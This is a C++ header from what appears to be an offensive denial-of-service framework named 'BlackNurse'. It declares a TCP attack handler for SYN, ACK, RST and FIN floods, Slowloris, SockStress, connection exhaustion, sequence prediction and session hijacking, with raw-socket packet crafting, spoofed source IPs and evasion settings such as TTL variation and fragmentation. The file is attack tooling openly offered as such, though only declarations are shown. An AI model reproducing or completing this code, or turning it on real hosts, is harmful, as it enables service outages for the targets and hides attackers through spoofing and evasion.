/**
 * BlackNurse Framework  - TCP Protocol Handler
 * 
 * TCP attack capabilities including SYN flood, ACK flood,
 * Slowloris, SockStress, and sophisticated connection-based attacks
 */

#pragma once

#include <string>
#include <vector>
#include <memory>
#include <atomic>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <chrono>
#include <random>
#include <queue>
#include <unordered_set>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <poll.h>
#include <sys/epoll.h>

#include "../framework/framework_core.hpp"
#include "../common/config.hpp"
#include "../common/logger.hpp"

namespace BlackNurse {

/**
 * TCP Packet Structure
 */
struct TcpPacket {
    // IP Header fields
    uint32_t src_ip;
    uint32_t dst_ip;
    uint8_t ttl = 64;
    uint16_t id = 0;
    uint16_t frag_off = 0;
    
    // TCP Header fields
    uint16_t src_port;
    uint16_t dst_port;
    uint32_t seq_num;
    uint32_t ack_num;
    uint8_t flags = 0;
    uint16_t window_size = 65535;
    uint16_t urgent_ptr = 0;
    
    // TCP Options
    std::vector<uint8_t> options;
    
    // Payload
    std::vector<uint8_t> payload;
    
    // Timing
    std::chrono::steady_clock::time_point timestamp;
};

/**
 * TCP Connection State
 */
enum class TcpConnectionState {
    CLOSED,
    LISTEN,
    SYN_SENT,
    SYN_RECEIVED,
    ESTABLISHED,
    FIN_WAIT_1,
    FIN_WAIT_2,
    CLOSE_WAIT,
    CLOSING,
    LAST_ACK,
    TIME_WAIT
};

/**
 * TCP Connection Information
 */
struct TcpConnection {
    int socket_fd = -1;
    uint32_t local_ip;
    uint16_t local_port;
    uint32_t remote_ip;
    uint16_t remote_port;
    TcpConnectionState state = TcpConnectionState::CLOSED;
    uint32_t seq_num = 0;
    uint32_t ack_num = 0;
    std::chrono::steady_clock::time_point last_activity;
    std::chrono::steady_clock::time_point creation_time;
    size_t bytes_sent = 0;
    size_t bytes_received = 0;
    bool keep_alive = false;
    std::vector<uint8_t> pending_data;
};

/**
 * TCP Configuration
 */
struct TcpConfig {
    uint16_t destination_port = 80;
    int threads = 4;
    int packets_per_second = 1000;
    bool use_raw_sockets = true;
    bool spoof_source_ip = false;
    bool fragment_packets = false;
    bool randomize_flags = false;
    std::vector<std::string> source_ips;
    int connection_timeout = 5;
    AttackType attack_type = AttackType::TCP_SYN_FLOOD;
    std::pair<uint16_t, uint16_t> source_port_range{1024, 65535};
};

/**
 * TCP Attack Configuration
 */
struct TcpAttackConfig {
    AttackType attack_type = AttackType::TCP_SYN_FLOOD;
    uint32_t concurrent_connections = 1000;
    uint32_t packets_per_second = 10000;
    uint16_t source_port_min = 1024;
    uint16_t source_port_max = 65535;
    bool randomize_source_ports = true;
    bool randomize_sequence_numbers = true;
    bool randomize_window_size = false;
    uint16_t custom_window_size = 65535;
    
    // SYN flood specific
    bool use_raw_sockets = true;
    bool spoof_source_ip = true;
    std::vector<std::string> spoofed_ip_ranges;
    
    // Slowloris specific
    std::chrono::seconds connection_timeout{300};
    std::chrono::milliseconds send_interval{10000};
    std::string partial_request_data;
    
    // SockStress specific
    uint32_t window_size_reduction = 1;
    std::chrono::milliseconds ack_delay{100};
    bool zero_window_attack = false;
    
    // Enhanced options
    std::vector<uint8_t> tcp_options;
    bool use_urgent_pointer = false;
    bool fragment_packets = false;
    uint16_t mtu_size = 1500;
    
    // Evasion
    bool vary_ttl = true;
    uint8_t min_ttl = 32;
    uint8_t max_ttl = 128;
    bool insert_dummy_options = false;
    bool randomize_ip_id = true;
};

/**
 * TCP Protocol Handler Implementation
 */
class TcpHandler : public ProtocolHandler {
public:
    TcpHandler();
    ~TcpHandler() override;
    
    // ProtocolHandler interface
    bool initialize(const blacknurse::Config& config) override;
    bool execute_attack(const Target& target, const AttackConfig& config, AttackStats& stats) override;
    bool supports_attack_type(AttackType type) const override;
    std::vector<EvasionTechnique> get_supported_evasions() const override;
    bool validate_target(const Target& target) const override;
    void cleanup() override;
    
    // TCP-specific methods
    bool send_tcp_packet(const TcpPacket& packet);
    bool establish_connection(const Target& target, TcpConnection& connection);
    bool close_connection(TcpConnection& connection);
    
    // Packet sending methods
    bool send_syn_packet(uint16_t source_port);
    bool send_ack_packet(uint16_t source_port);
    bool send_rst_packet(uint16_t source_port);
    bool send_fin_packet(uint16_t source_port);
    bool send_slowloris_connection();
    bool send_sockstress_packet(uint16_t source_port);
    bool send_raw_tcp_packet(uint16_t source_port, uint8_t flags);
    bool send_socket_connection(uint16_t source_port);
    
    // Checksum calculation
    uint16_t calculate_ip_checksum(struct iphdr* ip_header);
    uint16_t calculate_tcp_checksum(struct iphdr* ip_header, struct tcphdr* tcp_header);
    
    // Attack implementations
    bool execute_syn_flood(const Target& target, const TcpAttackConfig& config, AttackStats& stats);
    bool execute_ack_flood(const Target& target, const TcpAttackConfig& config, AttackStats& stats);
    bool execute_rst_flood(const Target& target, const TcpAttackConfig& config, AttackStats& stats);
    bool execute_fin_flood(const Target& target, const TcpAttackConfig& config, AttackStats& stats);
    bool execute_slowloris(const Target& target, const TcpAttackConfig& config, AttackStats& stats);
    bool execute_sockstress(const Target& target, const TcpAttackConfig& config, AttackStats& stats);
    bool execute_connection_exhaustion(const Target& target, const TcpAttackConfig& config, AttackStats& stats);
    bool execute_state_exhaustion(const Target& target, const TcpAttackConfig& config, AttackStats& stats);
    
    // Enhanced TCP attacks
    bool execute_tcp_sequence_prediction(const Target& target, const TcpAttackConfig& config, AttackStats& stats);
    bool execute_tcp_hijacking_attempt(const Target& target, const TcpAttackConfig& config, AttackStats& stats);
    bool execute_tcp_window_attack(const Target& target, const TcpAttackConfig& config, AttackStats& stats);
    bool execute_tcp_fragmentation_attack(const Target& target, const TcpAttackConfig& config, AttackStats& stats);
    
private:
    // Socket management
    class SocketPool {
    public:
        SocketPool(size_t max_sockets = 10000);
        ~SocketPool();
        
        int get_socket(bool raw_socket = false);
        void return_socket(int socket_fd);
        void cleanup();
        
    private:
        std::vector<int> available_sockets_;
        std::vector<int> raw_sockets_;
        std::unordered_set<int> active_sockets_;
        std::mutex pool_mutex_;
        size_t max_sockets_;
        std::atomic<size_t> current_count_{0};
    };
    
    std::unique_ptr<SocketPool> socket_pool_;
    
    // Connection management
    std::vector<std::unique_ptr<TcpConnection>> active_connections_;
    std::mutex connections_mutex_;
    
    // Raw socket for packet crafting
    int raw_socket_fd_ = -1;
    bool raw_socket_available_ = false;
    
    // Packet crafting
    TcpPacket craft_syn_packet(const Target& target, const TcpAttackConfig& config);
    TcpPacket craft_ack_packet(const Target& target, const TcpAttackConfig& config);
    TcpPacket craft_rst_packet(const Target& target, const TcpAttackConfig& config);
    TcpPacket craft_fin_packet(const Target& target, const TcpAttackConfig& config);
    TcpPacket craft_custom_packet(const Target& target, const TcpAttackConfig& config, uint8_t flags);
    
    // Packet serialization
    std::vector<uint8_t> serialize_packet(const TcpPacket& packet);
    void serialize_ip_header(std::vector<uint8_t>& buffer, const TcpPacket& packet);
    void serialize_tcp_header(std::vector<uint8_t>& buffer, const TcpPacket& packet);
    
    // Checksum calculation
    uint16_t calculate_ip_checksum(const std::vector<uint8_t>& header);
    uint16_t calculate_tcp_checksum(const TcpPacket& packet);
    uint16_t calculate_checksum(const uint8_t* data, size_t length, uint32_t sum = 0);
    
    // Source IP spoofing
    std::vector<uint32_t> spoofed_ips_;
    void generate_spoofed_ips(const std::vector<std::string>& ip_ranges);
    uint32_t get_random_spoofed_ip();
    bool is_valid_spoofed_ip(uint32_t ip);
    
    // Port management
    std::queue<uint16_t> available_ports_;
    std::unordered_set<uint16_t> used_ports_;
    std::mutex port_mutex_;
    uint16_t get_random_source_port(const TcpAttackConfig& config);
    void return_source_port(uint16_t port);
    
    // Sequence number management
    std::atomic<uint32_t> base_sequence_number_;
    uint32_t get_next_sequence_number(bool randomize = true);
    uint32_t predict_sequence_number(const TcpConnection& connection);
    
    // Connection state tracking
    void update_connection_state(TcpConnection& connection, const TcpPacket& packet);
    bool is_connection_established(const TcpConnection& connection);
    void cleanup_stale_connections();
    
    // Attack workers
    void syn_flood_worker(const Target& target, const TcpAttackConfig& config, AttackStats& stats);
    void slowloris_worker(const Target& target, const TcpAttackConfig& config, AttackStats& stats);
    void sockstress_worker(const Target& target, const TcpAttackConfig& config, AttackStats& stats);
    void connection_exhaustion_worker(const Target& target, const TcpAttackConfig& config, AttackStats& stats);
    void worker_thread(int thread_id);
    
    // Event handling
    int epoll_fd_ = -1;
    bool setup_epoll();
    void cleanup_epoll();
    void handle_socket_events();
    
    // Rate limiting
    std::chrono::steady_clock::time_point last_packet_time_;
    std::mutex rate_limit_mutex_;
    void enforce_rate_limit(uint32_t target_pps);
    
    // Statistics tracking
    std::atomic<uint64_t> packets_crafted_{0};
    std::atomic<uint64_t> connections_attempted_{0};
    std::atomic<uint64_t> connections_successful_{0};
    std::atomic<uint64_t> bytes_transmitted_{0};
    
    // Random generators
    std::random_device rd_;
    std::mt19937 gen_;
    std::uniform_int_distribution<uint16_t> port_dist_;
    std::uniform_int_distribution<uint32_t> seq_dist_;
    std::uniform_int_distribution<uint8_t> ttl_dist_;
    std::uniform_int_distribution<uint16_t> id_dist_;
    
    // Attack state
    std::atomic<bool> attack_active_{false};
    std::vector<std::thread> worker_threads_;
    std::atomic<bool> shutdown_requested_{false};
    
    // Internal state
    blacknurse::Config config_;
    TcpConfig tcp_config_;
    std::atomic<bool> running_;
    AttackStats stats_;
    std::chrono::steady_clock::time_point start_time_;
    std::vector<int> open_connections_;
    mutable std::mutex stats_mutex_;
    
    // Utility methods
    bool setup_raw_socket();
    void cleanup_raw_socket();
    bool set_socket_options(int socket_fd, const TcpAttackConfig& config);
    std::string connection_state_to_string(TcpConnectionState state);
    void log_packet(const TcpPacket& packet, const std::string& direction);
    void log_connection_event(const TcpConnection& connection, const std::string& event);
    
    // IP address utilities
    uint32_t string_to_ip(const std::string& ip_str);
    std::string ip_to_string(uint32_t ip);
    bool is_private_ip(uint32_t ip);
    bool is_multicast_ip(uint32_t ip);
    
    // TCP options handling
    void add_tcp_option(std::vector<uint8_t>& options, uint8_t kind, const std::vector<uint8_t>& data = {});
    void add_mss_option(std::vector<uint8_t>& options, uint16_t mss);
    void add_window_scale_option(std::vector<uint8_t>& options, uint8_t scale);
    void add_timestamp_option(std::vector<uint8_t>& options);
    void add_sack_permitted_option(std::vector<uint8_t>& options);
    
    // Evasion techniques
    void apply_tcp_evasions(TcpPacket& packet, const std::vector<EvasionTechnique>& techniques);
    void apply_ip_fragmentation(TcpPacket& packet);
    void apply_tcp_segmentation(TcpPacket& packet, size_t max_segment_size);
    void apply_option_padding(std::vector<uint8_t>& options);
    
    // Performance optimization
    void optimize_socket_buffers(int socket_fd);
    void tune_kernel_parameters();
    void adjust_worker_count(double cpu_usage);
};

/**
 * TCP Utility Functions
 */
namespace TcpUtils {
    std::string tcp_flags_to_string(uint8_t flags);
    uint8_t string_to_tcp_flags(const std::string& flags_str);
    bool is_valid_port(uint16_t port);
    bool is_privileged_port(uint16_t port);
    std::vector<uint16_t> parse_port_range(const std::string& range);
    std::vector<uint32_t> parse_ip_range(const std::string& range);
    uint16_t calculate_tcp_mss(uint16_t mtu);
    std::chrono::milliseconds estimate_rtt(const Target& target);
    bool is_port_open(const std::string& host, uint16_t port, std::chrono::milliseconds timeout = std::chrono::milliseconds(1000));
}

} // namespace BlackNurse